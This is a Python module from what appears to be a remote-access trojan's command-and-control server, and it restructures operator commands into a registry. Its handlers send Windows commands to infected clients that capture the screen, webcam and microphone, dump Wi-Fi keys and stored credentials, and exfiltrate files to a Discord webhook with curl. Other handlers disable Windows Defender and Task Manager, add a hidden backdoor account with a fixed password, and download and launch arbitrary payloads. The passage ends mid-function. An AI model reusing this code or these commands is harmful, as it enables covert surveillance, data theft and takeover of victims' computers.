"""Empire-style command registry for the C2 interactive shell.

Splits the monolithic if/elif dispatch that used to live inside
``C2.C2.interact_with_client`` into a plugin-style registry:

* ``Command`` — metadata (name, aliases, category, description) + handler.
* ``CommandRegistry`` — register / look up / run commands, grouped by
  category, mirroring the classic Empire ``commands/`` layout: one unit of
  behavior per command, discovered and dispatched through a single table.
* ``CmdContext`` — everything a handler needs from the interactive session
  (client manager, client record, socket, username, addr, logger) plus the
  ``send()`` primitive that encapsulates the repetitive send/recv/lock/
  ``command_in_progress`` boilerplate.

Handlers return ``None`` (handled, keep looping), ``"break"`` (leave the
interactive session), ``"continue"`` (skip to the next prompt) or
``"exit"`` (quit the whole C2 console) — the same contract the legacy
``break``/``continue`` statements had inside the old elif chain.

Commands not yet migrated keep their legacy elif blocks in ``C2.C2``; the
interactive loop tries the registry first, then the legacy chain, then the
raw ``CMD:`` fallthrough. Behaviour is byte-identical for migrated commands.
"""

from __future__ import annotations

import base64
import json
import os
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional, Tuple

from config import DISCORD_WEBHOOK, SERVER_IP

# ---------------------------------------------------------------------------
# Categories (mirror the help screen printed by the 'commands' command)
# ---------------------------------------------------------------------------
CATEGORY_FILE_OPS = "File Operations"
CATEGORY_MEDIA = "Media"
CATEGORY_NETWORK = "Network & Internet"
CATEGORY_SYSTEM_INFO = "System Info & Monitoring"
CATEGORY_SYSTEM_CONTROL = "System Control"
CATEGORY_USER_EXEC = "User & Execution"
CATEGORY_UTILITIES = "Utilities"
CATEGORY_DANGER = "Danger Zone"
CATEGORY_HELP = "Help"


# ---------------------------------------------------------------------------
# Core types
# ---------------------------------------------------------------------------
@dataclass
class Command:
    """One C2 command: metadata + the handler that implements it."""

    name: str
    handler: Callable[["CmdContext"], Optional[str]]
    category: str
    description: str
    aliases: Tuple[str, ...] = ()

    @property
    def all_names(self) -> Tuple[str, ...]:
        return (self.name,) + self.aliases


@dataclass
class CmdContext:
    """Everything a command handler needs from the interactive session."""

    cm: object          # ClientManager
    client: dict        # client record (conn, lock, command_in_progress, ...)
    conn: object        # socket
    username: str
    addr: tuple
    logger: Callable[[str], None]   # discord_logger

    def send(self, command: str) -> Tuple[bool, Optional[bytes]]:
        """Send ``CMD:<command>`` under the client lock.

        Mirrors the legacy inline boilerplate: marks ``command_in_progress``,
        sends, and on send failure clears the flag. Returns
        ``(sent, response)``; the caller decides how to react.
        """
        client = self.client
        with client["lock"]:
            client["command_in_progress"] = True
            if not self.cm._send_message(self.conn, f"CMD:{command}"):
                client["command_in_progress"] = False
                return False, None
            response = self.cm._recv_message(self.conn)
        return True, response

    def respond(self, response: Optional[bytes], log_msg: Optional[str] = None) -> None:
        """Print the response and (optionally) log it — legacy boilerplate."""
        if not response:
            return
        text = response.decode("utf-8", errors="ignore")
        print(text)
        if log_msg is not None:
            self.logger(log_msg)
        self.client["command_in_progress"] = False


class CommandRegistry:
    """Look-up table of commands by name and alias."""

    def __init__(self) -> None:
        self._commands: Dict[str, Command] = {}

    def register(self, command: Command) -> Command:
        for name in command.all_names:
            self._commands[name] = command
        return command

    def get(self, name: str) -> Optional[Command]:
        return self._commands.get(name)

    def contains(self, name: str) -> bool:
        return name in self._commands

    def list_commands(self) -> List[Command]:
        seen: Dict[str, Command] = {}
        for cmd in self._commands.values():
            seen[cmd.name] = cmd
        return sorted(seen.values(), key=lambda c: c.name)

    def by_category(self) -> Dict[str, List[Command]]:
        grouped: Dict[str, List[Command]] = {}
        for cmd in self.list_commands():
            grouped.setdefault(cmd.category, []).append(cmd)
        return grouped

    def help_text(self) -> str:
        """Generate a categorized help listing from the registry metadata."""
        lines = ["\n\nQuick Commands: --->"]
        for category in (
            CATEGORY_FILE_OPS, CATEGORY_MEDIA, CATEGORY_NETWORK,
            CATEGORY_SYSTEM_INFO, CATEGORY_SYSTEM_CONTROL, CATEGORY_USER_EXEC,
            CATEGORY_UTILITIES, CATEGORY_DANGER, CATEGORY_HELP,
        ):
            cmds = [c for c in self.list_commands() if c.category == category]
            if not cmds:
                continue
            lines.append(f"\n[📁 {category}]".replace("📁 ", "", 1) if False else f"\n[{category}]")
            for c in cmds:
                lines.append(f"  {c.name:<12}: {c.description}")
        return "\n".join(lines)

    def run(self, name: str, ctx: CmdContext) -> Optional[str]:
        """Run a command by name; returns None if not registered."""
        cmd = self._commands.get(name)
        if cmd is None:
            return None
        return cmd.handler(ctx)


# ---------------------------------------------------------------------------
# Handlers — migrated verbatim from C2.C2.interact_with_client
# ---------------------------------------------------------------------------
def _cmd_screenshot(ctx: CmdContext) -> Optional[str]:
    command2 = (
        'powershell -command "'
        'Add-Type -AssemblyName System.Windows.Forms; '
        'Add-Type -AssemblyName System.Drawing; '
        '$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, '
        '[System.Windows.Forms.SystemInformation]::VirtualScreen.Height); '
        '$graphics = [Drawing.Graphics]::FromImage($bmp); '
        '$graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, '
        '[System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); '
        '$path = Join-Path $env:USERPROFILE \'screenshot.png\'; '
        '$bmp.Save($path)"'
    )
    path2 = "%USERPROFILE%\\screenshot.png"
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    ctx.logger(f"Screenshot from [{ctx.username}]:")
    if response:
        ctx.respond(response, f"Screenshot Taken [{ctx.username}]")

    command3 = f'curl -F "file=@{path2}" -F "content=Screenshot [{ctx.username}]" {DISCORD_WEBHOOK}'
    sent, response = ctx.send(command3)
    if not sent:
        return "break"
    if response:
        ctx.respond(response)
    return None


def _cmd_devices(ctx: CmdContext) -> Optional[str]:
    command2 = 'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; if ($ff) { & $ff -list_devices true -f dshow -i dummy } else { Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' "'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        text = response.decode("utf-8", errors="ignore")
        print(text)
        ctx.logger(f"Devices [{ctx.username}]: {text}")
        ctx.client["command_in_progress"] = False
    return None


def _cmd_wifi(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("netsh wlan show profiles")
    if not sent:
        return "break"
    if response:
        print(response.decode("utf-8", errors="ignore"))
        name = input("Select network: ")
        command2 = (
            'powershell -NoProfile -Command "netsh wlan show profile name=\\"'
            + name
            + '\\" key=clear | Select-String \'(Key Content|\u0e40\u0e19\u0e37\u0e49\u0e2d\u0e2b\u0e32\u0e04\u0e35\u0e22\u0e4c'
            "|Key-Content)\\s*:\\s*(.+)$'"
        )
        sent, response2 = ctx.send(command2)
        if not sent:
            return "break"
        if response2:
            text2 = response2.decode("utf-8", errors="ignore")
            print(text2)
            ctx.client["command_in_progress"] = False
            ctx.logger(f"Wi-Fi password of [{ctx.username}] for the network: {name} is\n{text2}")
    return None


def _cmd_sys(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("systeminfo")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"(sys) [{ctx.username}]\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_task(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("tasklist")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Tasks List [{ctx.username}]\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_shutdown(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("shutdown /s /f /t 0")
    if not sent:
        return "break"
    ctx.logger(f"Shutting down (PC) [{ctx.username}] . . . .")
    if response:
        ctx.respond(response, f"Client [{ctx.username}] Shutdown\n\n{response.decode('utf-8', errors='ignore')}")
    ctx.client["command_in_progress"] = False
    return None


def _cmd_restart(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("shutdown /r /f /t 0")
    if not sent:
        return "break"
    ctx.logger(f"Restarting (PC) [{ctx.username}] . . . .")
    if response:
        ctx.respond(response, f"Client [{ctx.username}] Restarting\n\n{response.decode('utf-8', errors='ignore')}")
    ctx.client["command_in_progress"] = False
    return None


def _cmd_ip(ctx: CmdContext) -> Optional[str]:
    command2 = 'powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        text = response.decode("utf-8", errors="ignore")
        print(text)
        ctx.logger(f"Global IP for {ctx.username}: {text}")
        ctx.client["command_in_progress"] = False
    return None


def _cmd_lock(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("rundll32.exe user32.dll,LockWorkStation")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Locked User [{ctx.username}]\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_disable_task_manager(ctx: CmdContext) -> Optional[str]:
    command2 = r'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Task Manager Disabled for [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_enable_task_manager(ctx: CmdContext) -> Optional[str]:
    command2 = r'REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Task Manager Enabled for [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_recycle(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Emptied Recycle Bin on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_clipboard(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send('powershell -command "Get-Clipboard"')
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Clipboard [{ctx.username}]: \n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_rickroll(ctx: CmdContext) -> Optional[str]:
    command2 = (
        'start msedge --autoplay-policy=no-user-gesture-required '
        '"https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1" '
        '|| start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1'
    )
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"RickRoll video played on {ctx.username}\n\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_netscan(ctx: CmdContext) -> Optional[str]:
    command2 = 'powershell -NoProfile -Command "$ipPrefix = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike \'127.*\' -and $_.IPAddress -notlike \'169.254.*\' } | Select-Object -First 1).IPAddress -replace \'\\.\\d+$\'); if ($ipPrefix) { 1..254 | ForEach-Object { $target = \\"$ipPrefix.$_\\"; if (Test-Connection -ComputerName $target -Count 1 -Quiet -TimeoutMs 200) { \\"$target - $(Resolve-DnsName $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NameHost -ErrorAction SilentlyContinue)\\" } } } else { Write-Error \'No active IPv4 interface found.\' }"'
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"[{ctx.username}] netscan:\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_info(ctx: CmdContext) -> Optional[str]:
    command2 = (
        'powershell -Command "Get-ComputerInfo | Select OSName,OSVersion,WindowsVersion,CSName,'
        'CSDomain,BIOSManufacturer | Format-List; Get-WmiObject Win32_Battery | '
        'Select EstimatedChargeRemaining"'
    )
    sent, response = ctx.send(command2)
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"Got all machine info of [{ctx.username}]:\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_killav(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
    if not sent:
        return "break"
    if response:
        ctx.respond(
            response,
            f"Disabled Windows Defender AV on [{ctx.username}]\n\n {response.decode('utf-8', errors='ignore')}",
        )
    sent, response = ctx.send("taskkill /F /IM MsMpEng.exe")
    if not sent:
        return "break"
    if response:
        print(response.decode("utf-8", errors="ignore"))
    return None


def _cmd_creds(ctx: CmdContext) -> Optional[str]:
    sent, response = ctx.send("cmdkey /list > %TEMP%\\creds.txt")
    if not sent:
        return "break"
    if response:
        ctx.respond(response, f"[{ctx.username}] Creds:\n{response.decode('utf-8', errors='ignore')}")
    return None


def _cmd_send(ctx: CmdContext) -> Optional[str]:
    path = input("FULL Path of file: ")
    command2 = f'curl -F "file=@{path}" -F "content=File from [{ctx.username}]" {DISCORD_WEBHOOK}'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        ctx.logger(f'File from [{ctx.username}]:')
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"File: {path} sent to Server [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_get(ctx: CmdContext) -> Optional[str]:
    name = input("FULL File name: ")
    path_to_save = input("FULL PATH to save: ")
    command2 = f'curl http://{SERVER_IP}/{name} -o "{path_to_save}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"File: {name} sent to ctx.client [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_camera(ctx: CmdContext) -> Optional[str]:
    camera = input("Select the camera: ")
    command3 = (
        'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; '
        f'if ($ff) {{ Start-Process $ff -ArgumentList \'-f dshow -y -i video=\\"{camera}\\" -frames:v 1 -update 1 \\"$env:USERPROFILE\\webcam.jpg\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"'
    )
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command3}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"CameraShoot Taken [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False
    command4 = f'powershell -Command "if (Test-Path \'$env:USERPROFILE\\webcam.jpg\') {{ curl -F \\"file=@$env:USERPROFILE\\webcam.jpg\\" -F \\"content=Webcam [{ctx.username}]\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] webcam.jpg not found.\' }}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command4}"):
            ctx.client['command_in_progress'] = False
            return "break"
        ctx.logger(f'Cam Pic from [{ctx.username}]:')
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Photo Sent\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_extract(ctx: CmdContext) -> Optional[str]:
    path = input("FULL Path to file: ")
    path2 = input("FULL path to extract: ")
    command2 = f'powershell -NoProfile -Command "if (Test-Path \'C:\\Program Files\\WinRAR\\WinRAR.exe\') {{ & \'C:\\Program Files\\WinRAR\\WinRAR.exe\' x -ibck -inul \'{path}\' \'{path2}\' }} elseif (Test-Path \'C:\\Program Files\\7-Zip\\7z.exe\') {{ & \'C:\\Program Files\\7-Zip\\7z.exe\' x -y \'{path}\' -o\'{path2}\' }} else {{ Expand-Archive -Path \'{path}\' -DestinationPath \'{path2}\' -Force }}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Extracted File [{ctx.username}]: {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_copy(ctx: CmdContext) -> Optional[str]:
    path = input("FULL file path: ")
    path2 = input("FULL path to copy: ")
    command2 = f'xcopy "{path}" "{path2}" /s /i /y'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Copied [{ctx.username}] {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_cut(ctx: CmdContext) -> Optional[str]:
    path = input("FULL path: ")
    path2 = input("Move to: ")
    command2 = f'move "{path}" "{path2}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"File [{ctx.username}] {path} moved to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_record(ctx: CmdContext) -> Optional[str]:
    mic = input("Select mic: ")
    period = input("Seconds: ")
    ctx.logger(f"Recording Audio Now . . . .")
    command2 = f'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f dshow -y -i audio=\\"{mic}\\" -t {period} \\"$env:USERPROFILE\\mic.wav\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Audio Record Finished for [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")

    command3 = f'powershell -Command "if (Test-Path \'$env:USERPROFILE\\mic.wav\') {{ curl -F \\"file=@$env:USERPROFILE\\mic.wav\\" -F \\"content=Audio [{ctx.username}]\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] mic.wav not found.\' }}"'
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command3}"):
            ctx.client['command_in_progress'] = False
            return "break"
        ctx.logger(f'Voice recording [{ctx.username}]:')
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Audio Sent\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_ffmpeg(ctx: CmdContext) -> Optional[str]:
    command2 = f'curl http://{SERVER_IP}/ffmpeg.rar -o "%USERPROFILE%\\ffmpeg.rar"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"FFMPEG setting up for [{ctx.username}]")

    command3 = r'powershell -Command "if (Test-Path \'C:\Program Files\WinRAR\WinRAR.exe\') { & \'C:\Program Files\WinRAR\WinRAR.exe\' x -ibck -inul \'$env:USERPROFILE\ffmpeg.rar\' \'$env:USERPROFILE\' } elseif (Test-Path \'C:\Program Files\7-Zip\7z.exe\') { & \'C:\Program Files\7-Zip\7z.exe\' x -y \'$env:USERPROFILE\ffmpeg.rar\' -o\'$env:USERPROFILE\' } else { tar -xf \'$env:USERPROFILE\ffmpeg.rar\' -C \'$env:USERPROFILE\' }"'
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command3}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
    print("\nSetting up 'ffmpeg'. Please Wait at least 10 Minutes. \n")
    ctx.logger(f"Setting up 'ffmpeg' for [{ctx.username}]. Please Wait at least 10 Minutes.")
    if response:
        ctx.logger(f"FFMPEG\n\n{response.decode('utf-8', errors='ignore')}")
    ctx.client['command_in_progress'] = False

def _cmd_inject(ctx: CmdContext) -> Optional[str]:
    name = input("FULL name of file: ")
    command2 = f'curl -O http://{SERVER_IP}/{name} && start /B "" "{name}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"

        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Software {name} injected and ran on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

    return "continue"

def _cmd_user(ctx: CmdContext) -> Optional[str]:
    command2 = 'net user PhantomLink 8211 /add'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Added PhantomLink user with password: 8211 on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False
    admin = input("Admin? (y/n): ")
    if admin == 'y':
        command4 = r'REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v PhantomLink /t REG_DWORD /d 0 /f'
        with ctx.client['lock']:
            ctx.client['command_in_progress'] = True
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command4}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.logger(f"(User Admin)\n{response.decode('utf-8', errors='ignore')}")
            ctx.client['command_in_progress'] = False

def _cmd_hide(ctx: CmdContext) -> Optional[str]:
    path = input("FULL path to the file/folder: ")
    command2 = f'attrib +h +s "{path}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"File/Folder {path} made hidden on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_archive(ctx: CmdContext) -> Optional[str]:
    path = input("FULL path of folder: ")
    path2 = input("Save to: ")
    command2 = f'powershell -NoProfile -Command "Compress-Archive -Path \'{path}\\*\' -DestinationPath \'{path2}\' -Force"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"[{ctx.username}]\nFile {path} achived to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_alert(ctx: CmdContext) -> Optional[str]:
    name = input("Title: ")
    name2 = input("Message: ")
    command2 = f'powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox(\'{name2}\', \'Critical\', \'{name}\')"'
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"PopUp window appeared on [{ctx.username}]\nMessage: {name2}\nwith title{name}\n\n{response.decode('utf-8', errors='ignore')}")

    return "continue"

def _cmd_block(ctx: CmdContext) -> Optional[str]:
    period = input("ALERT: (Must be ADMIN).\nSeconds: ")
    command2 = fr'''powershell -Command "$code = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlockIt);'; $type = Add-Type -MemberDefinition $code -Name 'InputBlocker' -Namespace 'Win32' -PassThru; $type::BlockInput($true); Start-Sleep -Seconds {period}; $type::BlockInput($false)"'''
    ctx.logger(f"Blocking Inputs for {period} Seconds")
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Inputs Blocked on [{ctx.username}] for {period}\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_hosts(ctx: CmdContext) -> Optional[str]:
    rule = input("block / unblock: ")
    if rule.strip().lower() == 'block':
        link = input("Link to website: ")
        command2 = f'echo 127.0.0.1 {link} >> %WINDIR%\\System32\\drivers\\etc\\hosts'
        with ctx.client['lock']:
            ctx.client['command_in_progress'] = True
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.logger(f"Blocked {link} on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
            ctx.client['command_in_progress'] = False

        command5 = 'ipconfig /flushdns'
        with ctx.client['lock']:
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command5}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.logger(f"{response.decode('utf-8', errors='ignore')}")
    elif rule.strip().lower() == 'unblock':
        link2 = input("Enter the link without www or .com: ")
        endlink = input("Enter the end of link without '.' eg(com): ")
        command3 = f'powershell -Command "(Get-Content $env:windir\\System32\\drivers\\etc\\hosts) | Where-Object {{$_ -notmatch \\"127\\.0\\.0\\.1\\s+www\\.{link2}\\.{endlink}\\"}} | Set-Content $env:windir\\System32\\drivers\\etc\\hosts"'
        with ctx.client['lock']:
            ctx.client['command_in_progress'] = True
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command3}"):
                ctx.client['command_in_progress'] = False
                return "break"
